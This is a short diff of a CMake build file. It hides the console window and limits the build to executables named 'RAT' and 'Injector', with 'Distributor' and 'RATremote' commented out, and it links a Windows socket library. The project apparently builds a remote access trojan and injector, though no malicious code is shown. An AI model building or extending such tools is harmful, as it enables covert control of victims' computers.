@@ -21,7 +21,7 @@ include(CmakeToolsHelpers)
 set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} /MT")
 
 ##Select target subsystem, here no console
-#set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
+set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
 
 #set(CMAKE_BINARY_DIR ${CMAKE_SOURCE_DIR}/_builds) ##BINARY_DIR is now /bin
 #set(EXECUTABLE_OUTPUT_PATH ${CMAKE_BINARY_DIR}/Debug) ##OUTPUT_PATH is now /bin/exec
@@ -32,8 +32,8 @@ set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} /MT")
 
 ##${PROJECT_SOURCE_DIR} => full PATH to my project directoryl
 
-set(EXE_NAMES "RAT" "Injector" "Distributor" "RATremote")
-#set(EXE_NAMES "RAT" "Injector")
+#set(EXE_NAMES "RAT" "Injector" "Distributor" "RATremote")
+set(EXE_NAMES "RAT" "Injector")
 #set(EXE_NAMES "Distributor" "RATremote")
 
 set(LIB wsock32)
